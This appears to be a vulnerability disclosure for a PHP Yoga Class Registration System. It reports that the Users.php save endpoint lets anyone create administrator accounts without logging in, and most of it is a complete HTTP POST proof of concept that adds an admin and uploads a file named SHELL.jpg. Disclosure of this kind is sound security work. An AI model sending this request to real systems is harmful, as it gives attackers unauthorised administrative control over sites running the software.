## Yoga Class Registration System has Add by any user vulnerability

## submitter
zhangMingMing

## supplier
https://www.sourcecodester.com/php/16097/yoga-class-registration-system-php-and-mysql-free-source-code.html

## Vulnerability file
/php-ycrs/classes/Users.php?f=save


## describe
There is a vulnerability in the yoga registration system that allows unlimited user addition. An attacker can use this vulnerability to add administrators to the target system without authorization.

POC
```
POST /php-ycrs/classes/Users.php?f=save HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------308812365014834483211343127358
Content-Length: 1036
Origin: http://localhost
Connection: close
Referer: http://localhost/php-ycrs/admin/?page=user/manage_user
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

-----------------------------308812365014834483211343127358
Content-Disposition: form-data; name="id"


-----------------------------308812365014834483211343127358
Content-Disposition: form-data; name="firstname"

a
-----------------------------308812365014834483211343127358
Content-Disposition: form-data; name="middlename"

a
-----------------------------308812365014834483211343127358
Content-Disposition: form-data; name="lastname"

a
-----------------------------308812365014834483211343127358
Content-Disposition: form-data; name="username"

adc
-----------------------------308812365014834483211343127358
Content-Disposition: form-data; name="password"

a
-----------------------------308812365014834483211343127358
Content-Disposition: form-data; name="type"

1
-----------------------------308812365014834483211343127358
Content-Disposition: form-data; name="img"; filename="SHELL.jpg"
Content-Type: application/octet-stream

2222
-----------------------------308812365014834483211343127358--
```

Add administrators directly without logging in.
<img width="1259" alt="image" src="https://github.com/user-attachments/assets/75efd4e7-4476-4228-a75e-502c2c16866c">

<img width="1501" alt="image" src="https://github.com/user-attachments/assets/2c1b3dd0-469f-47fc-b461-148248c98ef2">







